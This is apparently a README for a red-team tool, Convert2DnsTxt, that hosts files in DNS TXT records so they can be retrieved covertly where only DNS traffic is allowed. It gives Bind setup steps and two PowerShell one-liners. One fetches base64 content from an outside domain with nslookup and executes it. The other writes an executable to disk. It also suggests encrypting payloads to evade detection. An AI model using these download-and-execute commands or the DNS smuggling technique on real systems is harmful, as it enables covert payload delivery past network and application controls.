<h1>Convert2DnsTxt</h1>
Convert2DnsTxt is a simple project to illustrate how DNS TXT records could be used to host files.  This could be used to somewhat covertly retrieve files even if the environment only allowed DNS traffic to trusted servers, thanks to recursive queries.  When I've implemented similar things on red team operations, I usually purchase a cheap domain, create an A record and NS record to point a subdomain at a VPS that redirects traffic on UDP 53 to a server I have hosted locally with Bind installed.  With that setup, I can access tools I have hosted in TXT records from practically anywhere just by using nslookup -q=txt.  Similar setups can be used to perform C2 over DNS, but I prefer to use A records and CNAMES to remain a little more covert.
<br>
<h2>Scripts</h2>
<ul>
   <li><b>install_bind9.sh</b>
      <ul><br>
         <li><b>Usage:</b> sudo ./install_bind9.sh [domain] [IP]</li>
         <li><b>Example:</b> sudo ./install_bind9.sh txt.pwntheinter.net 192.168.1.1</li>
         <li>This script installs Bind9 and configures it for your domain.  It will accept a subdomain and IP as parameters.  If no parameters are passed it will prompt for a domain to use and use the IP of the first network interface from the results of ifconfig.  This was written and tested on Ubuntu.</li>
      </ul><br>
   </li>
   <li><b>Convert2DnsTxt.py</b>
      <ul><br>
         <li><b>Usage:</b> sudo ./Convert2DnsTxt.py</li>
         <li>This script will prompt for a file to convert, a DNS TXT record to use, a file location to write the results to, and ask whether or not you would like to restart Bind.  The intended use of this script is give it a file to convert, which will be broken up into multiple TXT records of the same name, if necessary, write it to your domain's zone file, and restart Bind so the changes take effect.  This way, you can quickly add files to TXT records as needed.
         </li>
      </ul>
   </li>
</ul>
<h2>Examples of DNS TXT Usage</h2>
I have a PowerShell script and a "Hello World" executable hosted at txt.pwntheinter.net for testing purposes.  There are a number of ways to retrieve these but the following commands are just a couple of PowerShell examples to illustrate a couple methods:
<ul>
   <li>PowerShell command to download and execute Invoke-ProcessFromParent
      <ul><br>
         <li>.([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((((nslookup -q=txt ipfp.txt.pwntheinter.net) | Sort-Object | where { $_.startswith([char]9) }) -join "" -replace '\t"\d{1,}.|"', '')))))</li>
      </ul><br>
   </li>
   <li>PowerShell command to download and write hello.exe to the current working directory
      <ul><br>
         <li>[IO.File]::WriteAllBytes("hello.exe", [Convert]::FromBase64String((((nslookup -q=txt hello.txt.pwntheinter.net) | Sort-Object | where { $_.startswith([char]9) }) -join "" -replace '\t"\d{1,}.|"', '')))
         </li>
      </ul>
   </li>
</ul>
<h2>Limitations</h2>
I haven't done exhaustive testing but I have discovered issues arise if there are more than 240 TXT records of the same name.  In such cases, I wouldn't get back any results via nslookup, which is the primary way I was resolving names as I test in a restricted environment with somewhat strict application whitelisting enabled.  You can have 255 characters per TXT record so 240 x 255 = 61,200 characters.  In the example script the file is base64 encoded and prepended with "###." to make sorting easier.  In a real operation, you would want to encrypt then encode the script while decoding, decrypting, and then sorting on the target to better obfuscate what you have hosted.  There is also nothing stopping you from spreading the file over multiple TXT records of different names.

